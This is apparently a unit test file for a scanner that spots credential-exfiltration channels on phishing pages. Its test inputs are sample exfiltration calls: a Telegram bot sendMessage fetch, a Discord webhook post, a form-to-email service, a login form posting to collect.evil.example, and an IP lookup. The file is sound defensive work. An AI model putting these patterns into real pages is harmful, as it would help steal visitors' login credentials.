import { describe, expect, it } from "vitest";
import type { FieldInfo, FormInfo } from "../page/extract.ts";
import { MAX_INLINE_SCRIPT, scanExfil } from "./exfil-scan.ts";

function field(over: Partial<FieldInfo>): FieldInfo {
  return {
    tag: "input",
    type: "text",
    name: "",
    id: "",
    autocomplete: "",
    placeholder: "",
    label: "",
    inputMode: "",
    maxLength: null,
    visible: true,
    secret: null,
    ...over,
  };
}
const passwordForm = (action: string): FormInfo => ({
  action,
  method: "post",
  loose: false,
  fields: [field({ type: "email" }), field({ type: "password", secret: "password" })],
});
const scan = (over: Partial<Parameters<typeof scanExfil>[0]>) =>
  scanExfil({ forms: [], scriptSrcs: [], inlineScript: "", ...over });

describe("scanExfil", () => {
  it("finds a Telegram bot, a Discord webhook, or a form-to-email service in page code", () => {
    expect(
      scan({ inlineScript: 'fetch("https://api.telegram.org/bot123:ABC/sendMessage", …)' })
        .endpoint,
    ).toBe("telegram");
    expect(scan({ inlineScript: "post('https://discord.com/api/webhooks/1/x')" }).endpoint).toBe(
      "discord",
    );
    expect(
      scan({ inlineScript: "$.ajax({url:'https://formsubmit.co/ajax/a@b.c'})" }).endpoint,
    ).toBe("formService");
    expect(
      scan({ scriptSrcs: ["https://cdn.example/x.js?to=api.telegram.org/bot9"] }).endpoint,
    ).toBe("telegram");
  });

  it("finds a login form that posts to a form-to-email service", () => {
    expect(scan({ forms: [passwordForm("https://submit-form.com/abc123")] }).endpoint).toBe(
      "formService",
    );
  });

  it("collects where login forms post, and ignores search and newsletter forms", () => {
    const search: FormInfo = {
      action: "https://search.example/q",
      method: "get",
      loose: false,
      fields: [field({ type: "search", name: "q" })],
    };
    const out = scan({
      forms: [passwordForm("https://collect.evil.example/p.php"), search, passwordForm("")],
    });
    expect(out.formHosts).toEqual(["collect.evil.example"]);
    expect(out.endpoint).toBeNull();
  });

  it("flags a visitor-IP lookup as supporting only", () => {
    expect(scan({ inlineScript: "fetch('https://ipapi.co/json')" })).toEqual({
      endpoint: null,
      ip: true,
      formHosts: [],
    });
  });

  it("finds nothing on an ordinary login page", () => {
    expect(
      scan({ forms: [passwordForm("/session")], inlineScript: "window.dataLayer = [];" }),
    ).toEqual({ endpoint: null, ip: false, formHosts: [] });
  });

  it("only reads the first part of a huge inline script", () => {
    const pad = " ".repeat(MAX_INLINE_SCRIPT);
    expect(scan({ inlineScript: `${pad}api.telegram.org/bot1` }).endpoint).toBeNull();
  });
});
